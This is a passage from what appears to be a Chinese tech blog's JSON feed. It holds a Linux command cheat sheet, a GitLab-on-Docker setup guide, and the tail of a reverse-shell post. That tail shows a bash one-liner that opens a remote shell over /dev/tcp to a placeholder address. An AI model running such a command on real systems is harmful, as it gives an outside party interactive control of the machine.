<code>sh</code> ，而 <code>sh</code>  实际指向的是非交互式终端  <code>dash</code> ，需要先切换到 <code>bash</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bach -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-c 执行 command string</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "linux",
                "reverse-shell"
            ]
        },
        {
            "id": "https://snowroll.github.io/linux-commands/",
            "url": "https://snowroll.github.io/linux-commands/",
            "title": "linux常用命令汇总",
            "date_published": "2022-07-28T02:35:04.000Z",
            "content_html": "<ol>\n<li><strong>强制命令模式执行： <code>:w !sudo tee %</code> </strong></li>\n</ol>\n  <figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">w： 表示保存文件</span><br><span class=\"line\">！： 表示执行外部命令</span><br><span class=\"line\">tee： linux命令，这个有点复杂，可以查看linux命令帮助</span><br><span class=\"line\">%： 在执行外部命令时，%会扩展成当前文件名；这个%区别于替换时的%，替换时%的意义是代表整个文件，而不是文件名</span><br><span class=\"line\"></span><br><span class=\"line\"># 只读文件，不修改强制退出</span><br><span class=\"line\">q!</span><br></pre></td></tr></table></figure>\n<p>上述方式非常完美的解决了不能保存只读文件的问题，但毕竟命令还是有些长，为了避免每次输入一长串的命令，可以将它映射为一个简单的命令加到 .vimrc 中：</p>\n  <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; Allow saving of files as sudo when I forgot to start vim using sudo.</span><br><span class=\"line\"> cmap w!! w !sudo tee &gt; /dev/null %</span><br></pre></td></tr></table></figure>\n<p>这样，简单的运行:w!! 即可。命令后半部分 &gt; /dev/null 作用为显式的丢掉标准输出的内容。</p>\n<ol start=\"2\">\n<li><strong>删除大量文件</strong></li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjQ3Mjkw\">Linux 下删除大量文件效率对比，看谁删的快！</span></p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 首先建立空文件夹blanktest</span></span><br><span class=\"line\">$ time rsync -a --delete blanktest/ <span class=\"built_in\">test</span>/</span><br><span class=\"line\">rsync -a --delete blanktest/ <span class=\"built_in\">test</span>/  0.59s user 7.86s system 51% cpu 16.418 total</span><br><span class=\"line\">16s，很好很强大。</span><br></pre></td></tr></table></figure>\n<ol>\n<li>查看磁盘可用空间</li>\n</ol>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">df -h  <span class=\"comment\"># 查看磁盘可用空间</span></span><br><span class=\"line\">du -h --max-depth=1  ./  <span class=\"comment\"># 查看当前目录及其目录的文件大小</span></span><br><span class=\"line\">du -sh ./  <span class=\"comment\"># 查看当前目录总大小</span></span><br></pre></td></tr></table></figure>\n<ol>\n<li>apt-get 下载失败 <strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8zNjMyMDAvZS11bmFibGUtdG8tY29ycmVjdC1wcm9ibGVtcy15b3UtaGF2ZS1oZWxkLWJyb2tlbi1wYWNrYWdlcw==\">E: Unable to correct problems, you have held broken packages</span></strong></li>\n</ol>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 改用aptitude，更加方便智能</span></span><br><span class=\"line\">sudo apt-get install aptitude</span><br><span class=\"line\">aptitude get install yourpkg</span><br></pre></td></tr></table></figure>\n<ol>\n<li>\n<p>查看进程</p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 特定用户的特定进程</span></span><br><span class=\"line\">ps -u root -ef | grep consume </span><br><span class=\"line\"><span class=\"comment\"># kill特定用户的所有进程</span></span><br><span class=\"line\"><span class=\"comment\"># 1. 打印出所有pid，再kill</span></span><br><span class=\"line\">ps -ef | grep ttlsa | awk <span class=\"string\">&#x27;&#123; print $2 &#125;&#x27;</span> | sudo xargs <span class=\"built_in\">kill</span> -9</span><br><span class=\"line\"><span class=\"comment\"># 2. -v --invert-match 显示不包含匹配文本的所有行</span></span><br><span class=\"line\">ps -ef | grep dynamic.sh | grep -v grep | awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class=\"built_in\">kill</span> -9</span><br><span class=\"line\"><span class=\"comment\"># 3. pgrep -u参数查出用户的所有pid，然后依次kill</span></span><br><span class=\"line\">pgrep -u ttlsa | sudo xargs <span class=\"built_in\">kill</span> -9</span><br><span class=\"line\"><span class=\"comment\"># 查看进程 -e 显示系统内所有进程信息 -l long 长格式显示 -f full 完整显示</span></span><br><span class=\"line\">ps -elf</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>ps -aux 解释</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#   user     pid  cpu mem  vsz   rss  tty  stat start time command</span></span><br><span class=\"line\">&gt;&gt; chaihua+ 26879 0.0 0.0 112820 968 pts/47 S+  15:49 0:00 grep --color=auto chaihuajun</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th>列名</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>USER</td>\n<td>进程的拥有者用户名</td>\n</tr>\n<tr>\n<td>PID</td>\n<td>进程的 ID</td>\n</tr>\n<tr>\n<td>%CPU</td>\n<td>该进程使用 CPU 资源的百分比</td>\n</tr>\n<tr>\n<td>%MEM</td>\n<td>该进程使用内存资源的百分比</td>\n</tr>\n<tr>\n<td>VSZ</td>\n<td>进程使用的虚拟内存大小</td>\n</tr>\n<tr>\n<td>RSS</td>\n<td>进程使用的实际内存大小</td>\n</tr>\n<tr>\n<td>TTY</td>\n<td>进程所绑定的终端</td>\n</tr>\n<tr>\n<td>STAT</td>\n<td>进程的状态</td>\n</tr>\n<tr>\n<td>START</td>\n<td>进程的启动时间</td>\n</tr>\n<tr>\n<td>TIME</td>\n<td>该进程占用 CPU 时间的累计值</td>\n</tr>\n<tr>\n<td>COMMAND</td>\n<td>进程所对应的命令</td>\n</tr>\n</tbody>\n</table>\n<p>其中， <code>-u</code>  参数指定了只显示与当前用户相关的进程，而  <code>x</code>  参数指定了显示所有进程，包括没有控制终端的进程。</p>\n</li>\n</ul>\n</li>\n<li>\n<p>查看内存</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   </span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>更改文件夹权限及用户</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -R 递归 修改文件所有者</span></span><br><span class=\"line\">chown [-R] username dirname/filename</span><br><span class=\"line\"><span class=\"comment\"># 修改文件所在群组</span></span><br><span class=\"line\">chgrp [-R] groupname dirname/filename</span><br><span class=\"line\"><span class=\"comment\"># 查看用户组</span></span><br><span class=\"line\">cat /etc/group</span><br><span class=\"line\"><span class=\"comment\"># 创建群组</span></span><br><span class=\"line\">groupadd groupName</span><br><span class=\"line\"><span class=\"comment\"># 将用户添加到指定组 -a append -G 将一个用户添加到多个群组</span></span><br><span class=\"line\">usermod -a -G groupA user</span><br><span class=\"line\"><span class=\"comment\"># 修改访问权限</span></span><br><span class=\"line\"><span class=\"comment\"># ll 查看文件属性</span></span><br></pre></td></tr></table></figure>\n<p>drwxrw-r–</p>\n<ul>\n<li>d 属性</li>\n<li>rwx 所有者权限</li>\n<li>rw- 群组用户权限</li>\n<li>r-- 其他用户权限</li>\n</ul>\n<p><code>chmod</code>  用数字修改文件访问权限，绝对权限</p>\n<table>\n<thead>\n<tr>\n<th>权限</th>\n<th>数字</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>r</td>\n<td>4</td>\n</tr>\n<tr>\n<td>w</td>\n<td>2</td>\n</tr>\n<tr>\n<td>x</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<p><code>chmod</code>  用字母分配权限，相对权限</p>\n<table>\n<thead>\n<tr>\n<th>字母</th>\n<th>含义</th>\n<th>符号</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>u</td>\n<td>所有者</td>\n<td>+</td>\n<td>添加权限</td>\n</tr>\n<tr>\n<td>g</td>\n<td>群组用户</td>\n<td>-</td>\n<td>移除权限</td>\n</tr>\n<tr>\n<td>o</td>\n<td>其他用户</td>\n<td>=</td>\n<td>分配权限</td>\n</tr>\n<tr>\n<td>a</td>\n<td>所有用户</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p><code>chmod g+rx file</code>   给群组用户添加可读、可执行权限</p>\n</li>\n<li>\n<p>ssh 配置公私钥</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9seHcxODQ0OTEyNTE0LzI5NDA3Mjc=\">参考链接：公私钥配置</span></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 生成公私钥对 -t 密钥类型 -c 注释文字</span></span><br><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&#x27;chaihj15@163.com&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># .ssh下找到id_rsa.pub 上传到服务器</span></span><br><span class=\"line\"><span class=\"comment\"># 追加到服务器ssh认证文件中</span></span><br><span class=\"line\">cat /xxx/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果没有authorized_keys，创建&amp;赋予600权限</span></span><br><span class=\"line\">touch authorized_keys</span><br><span class=\"line\">chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>\n<p>本机创建～/.ssh/config</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host            alias            #自定义别名</span><br><span class=\"line\">HostName        114.11.11.110         #替换为你的ssh服务器ip或domain</span><br><span class=\"line\">Port            22             #ssh服务器端口，默认为22</span><br><span class=\"line\">User            root             #ssh服务器用户名</span><br><span class=\"line\">IdentityFile    ~&#x2F;.ssh&#x2F;id_rsa    #第一个步骤生成的公钥文件对应的私钥文件</span><br></pre></td></tr></table></figure>\n<p>更改权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 600 config</span><br></pre></td></tr></table></figure>\n<p>运行，愉快登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh alias</span><br></pre></td></tr></table></figure>\n<p>有些服务器默认不支持密钥登陆，需要修改 <code>/etc/ssh/sshd_config</code>  配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">去掉<span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#PubkeyAuthentication yes</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>发现本机 ip</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl ifconfig.me</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n",
            "tags": [
                "linux",
                "shell"
            ]
        },
        {
            "id": "https://snowroll.github.io/gitlab/",
            "url": "https://snowroll.github.io/gitlab/",
            "title": "gitlab服务器搭建",
            "date_published": "2022-07-26T09:27:08.000Z",
            "content_html": "<h1 id=\"环境配置\"><a class=\"markdownIt-Anchor\" href=\"#环境配置\">#</a> 环境配置</h1>\n<p>两台 linux 服务器（Ubuntu 系统），一台搭建 Gitlab 服务端，另一台配置 Gitlab runner</p>\n<h1 id=\"gitlab下载安装\"><a class=\"markdownIt-Anchor\" href=\"#gitlab下载安装\">#</a> Gitlab 下载安装</h1>\n<p>采用 Docker 的形式进行安装，官方文档 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGxhYi5jb20vZWUvaW5zdGFsbC9kb2NrZXIuaHRtbA==\">https://docs.gitlab.com/ee/install/docker.html</span></p>\n<h2 id=\"ubuntu安装docker\"><a class=\"markdownIt-Anchor\" href=\"#ubuntu安装docker\">#</a> Ubuntu 安装 Docker</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>\n<h2 id=\"下载配置gitlab镜像\"><a class=\"markdownIt-Anchor\" href=\"#下载配置gitlab镜像\">#</a> 下载配置 Gitlab 镜像</h2>\n<ul>\n<li>\n<p>设置环境变量</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export GITLAB_HOME=/srv/gitlab</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>下载安装 Docker</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run --detach \\</span><br><span class=\"line\">  --hostname gitlab.example.com \\</span><br><span class=\"line\">  --publish 8443:443 --publish 8080:80 --publish 8022:22 \\</span><br><span class=\"line\">  --name gitlab \\</span><br><span class=\"line\">  --restart always \\</span><br><span class=\"line\">  --volume $GITLAB_HOME/config:/etc/gitlab \\</span><br><span class=\"line\">  --volume $GITLAB_HOME/logs:/var/log/gitlab \\</span><br><span class=\"line\">  --volume $GITLAB_HOME/data:/var/opt/gitlab \\</span><br><span class=\"line\">  --shm-size 256m \\</span><br><span class=\"line\">  gitlab/gitlab-ee:latest</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p><code>hostname</code>  主机名，随便设置</p>\n</li>\n<li>\n<p><code>publish</code>  Docker 和宿主机之间的端口映射， <code>8080:80</code>  表示宿主机的 8080 端口映射到容器的 80 端口，此时访问宿主机的 8080 端口即可访问 nginx 的默认页面</p>\n</li>\n<li>\n<p><code>name</code>  容器名</p>\n</li>\n<li>\n<p><code>restart always</code>  Docker 重启时，容器自动重启</p>\n</li>\n<li>\n<p><code>shm-size</code>  共享内存大小</p>\n</li>\n</ul>\n<blockquote>\n<p>扩展： Nginx 是什么？ 参考文章 <span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNDk0MzMzMg==\">https://zhuanlan.zhihu.com/p/34943332</span></p>\n<p>Nginx 是一个轻量级的反向代理服务器。</p>\n<p><code>用户</code>  =&gt; vpn (正向代理) =&gt;  <code>服务器</code>        <code>服务器</code>  =&gt; nginx (反向代理) =&gt;  <code>用户</code></p>\n<p>启动 Nginx 服务后，就相当于在 80 端口启动了 Socket 服务进行监听，如下图所示</p>\n<img data-src=\"/gitlab/nginx.jpg\" class=\"\">\n</blockquote>\n</li>\n</ul>\n<h2 id=\"修改镜像gitlab的配置\"><a class=\"markdownIt-Anchor\" href=\"#修改镜像gitlab的配置\">#</a> 修改镜像 <code>gitlab</code>  的配置</h2>\n<ul>\n<li>\n<p>进入容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker exec -it gitlab /bin/bash</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>修改配置文件</p>\n<p><strong>配置文件</strong>  <code>/etc/gitlab/gitlab.rb</code>   和  <code>/var/opt/gitlab/gitlab-rails/etc/gitlab.yml</code></p>\n<p>其中 <code>gitlab.yml</code>  由 <code>gitlab-ctl</code>  管理，通过编辑 <code>/etc/gitlab/gitlab.rb</code> ，然后运行 <code>gitlab-ctl reconfigure</code>  会自动更新 <code>gitlab.yml</code> 。因此，一般不修改 <code>gitlab.yml</code>  文件</p>\n<ul>\n<li>\n<p>修改配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/gitlab/gitlab.rb</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>在公网 IP 访问 GitLab</p>\n<p><em>tips:</em> 在 <code>vi</code>  下通过  <code>/external_url</code>  快速查找</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">external_url &quot;http://your_ip_or_domain:8080&quot;</span><br></pre></td></tr></table></figure>\n<p>如果 <code>nginx['listen_port']</code>  没有特殊指定，其会从 <code>external_url</code>  拉取</p>\n</li>\n<li>\n<p>设置 shell 端口</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">gitlab_rails[&#x27;gitlab_shell_ssh_port&#x27;]</span> <span class=\"string\">=</span> <span class=\"number\">8022</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>重新配置 GitLab</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">gitlab-ctl</span> <span class=\"string\">reconfigure</span></span><br></pre></td></tr></table></figure>\n<p>实测结果</p>\n<center><img data-src=\"/gitlab/gitlab.png\" class=\"\">\n<p>这里的密码在  <code>/etc/gitlab/initial_root_password</code>  中，这个文件初次配置后 24h 会自动删除。</p>\n</li>\n<li>\n<p>修改密码 （忘记密码的情况下）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 进入gitlab 容器</span></span><br><span class=\"line\">docker exec -it gitlab /bin/bash</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 修改密码，这里可能会等很久，耐心一点</span></span><br><span class=\"line\">gitlab-rake &quot;gitlab:password:reset[root]”</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"配置优化\"><a class=\"markdownIt-Anchor\" href=\"#配置优化\">#</a> 配置优化</h1>\n<p>GitLab 非常吃内存，我刚开始搭建，服务器疯狂卡死，网页 502。建议配置的服务器内存在 4G 以上</p>\n<h2 id=\"修改gitlabrb中的配置\"><a class=\"markdownIt-Anchor\" href=\"#修改gitlabrb中的配置\">#</a> 修改 <code>gitlab.rb</code>  中的配置</h2>\n<p>参考 https://www.dongchuanmin.com/operate/3240.html</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">puma[&#x27;worker_timeout&#x27;]</span> <span class=\"string\">=</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"string\">gitlab_rails[&#x27;time_zone&#x27;]</span> <span class=\"string\">=</span> <span class=\"string\">&#x27;Asia/Shanghai&#x27;</span></span><br><span class=\"line\"><span class=\"string\">puma[&#x27;worker_processes&#x27;]</span> <span class=\"string\">=</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"string\">postgresql[&#x27;shared_buffers&#x27;]</span> <span class=\"string\">=</span> <span class=\"string\">&quot;256MB&quot;</span></span><br><span class=\"line\"><span class=\"string\">sidekiq[&#x27;max_concurrency&#x27;]</span> <span class=\"string\">=</span> <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"string\">postgresql[&#x27;max_worker_processes&#x27;]</span> <span class=\"string\">=</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"string\">puma[&#x27;per_worker_max_memory_mb&#x27;]</span> <span class=\"string\">=</span> <span class=\"number\">600</span></span><br><span class=\"line\"><span class=\"string\">prometheus_monitoring[&#x27;enable&#x27;]</span> <span class=\"string\">=</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"string\">sidekiq[&#x27;min_concurrency&#x27;]</span> <span class=\"string\">=</span> <span class=\"number\">8</span></span><br></pre></td></tr></table></figure>\n<p>官方推荐的优化配置 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGxhYi5jbi9vbW5pYnVzL3NldHRpbmdzL21lbW9yeV9jb25zdHJhaW5lZF9lbnZzLmh0bWw=\">https://docs.gitlab.cn/omnibus/settings/memory_constrained_envs.html</span></p>\n<p>修改完成之后，重启配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>启动 swap 分区</p>\n<p>物理内存 + swap（交换空间） = 虚拟内存</p>\n<p>swap 分区，即交换空间，可以是磁盘的一个分区，也可以是一个文件。作用就是将一部分内存空间复制到硬盘空间中，释放这部分内存。某种程度而言，扩大了可用的内存空间，但与硬盘的交换必然带来性能的下降。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看swap分区是否启动</span></span><br><span class=\"line\">cat /proc/swaps</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 创建swap，dd device driver，用于读取文件中内容，并复制到指定位置</span></span><br><span class=\"line\">dd if=/dev/zero of=/data/swap bs=512 count=8388616</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"keyword\">if</span> 输入文件 of 输出文件 /dev/zero 输出恒为0的设备文件 bs bytes count 块数</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> swap文件大小为 bs * counnt = 4294971392(4G)；</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 通过mkswap命令将上面新建出的文件做成swap分区</span></span><br><span class=\"line\">mkswap /data/swap</span><br><span class=\"line\"></span><br><span class=\"line\">4.查看内核参数vm.swappiness中的数值是否为0，如果为0则根据实际需要调整成60。这个参数为换出运行时内存的相对权重，内存超过 40% 开始使用swap</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看内核参数vm.swappiness 数值，代表换出运行时内存的相对权重</span></span><br><span class=\"line\">cat /proc/sys/vm/swappiness</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 设置为60，即当内存超过 100-60 = 40%，开始使用swap</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 永久修改需编辑/etc/sysctl.conf文件</span></span><br><span class=\"line\">sysctl -w vm.swappiness=60</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 启用分区</span></span><br><span class=\"line\">swapon /data/swap</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 在/etc/fstab文件中记录文件的名字，使系统重启后，swap依然有效</span></span><br><span class=\"line\">echo “/data/swap swap swap defaults 0 0” &gt;&gt; /etc/fstab</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看确认</span></span><br><span class=\"line\">cat /proc/swaps</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 重启gitlab</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>释放 buffer/cache</p>\n<p>参考文章 <span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81Mzk1NTMyMTc=\">https://zhuanlan.zhihu.com/p/539553217</span></p>\n<p>程序运行一段时间后，linux 会将暂时不用的内存转换为 buffer/cache，通过 <code>free</code>  命令可以查看系统内存使用情况</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">free -m -h</span><br></pre></td></tr></table></figure>\n<p>输出结果</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">              total        used        free      shared  buff/cache   available</span><br><span class=\"line\"></span><br><span class=\"line\">Mem:          7.8Gi       3.2Gi       3.5Gi        50Mi       1.1Gi       4.3Gi</span><br><span class=\"line\">Swap:            0B          0B          0B</span><br></pre></td></tr></table></figure>\n<p>我们可以手动释放 buff/cache</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 将在内存中的数据写入磁盘，防止丢失</span></span><br><span class=\"line\">sync</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 释放内存</span></span><br><span class=\"line\">echo 3 &gt; /proc/sys/vm/drop_caches</span><br></pre></td></tr></table></figure>\n<p>内存的管理方式在 <code>/proc/sys/vm/ drop_chches</code>  文件中，其只包含一个数字，不同代号的含义如下所示</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0：0 是系统默认值，默认情况下表示不释放内存，由操作系统自动管理</span><br><span class=\"line\">1：释放页缓存</span><br><span class=\"line\">2：释放dentries和inodes</span><br><span class=\"line\">3：释放所有缓存</span><br></pre></td></tr></table></figure>\n<p>Page Cache 的解释 <span class=\"exturl\" 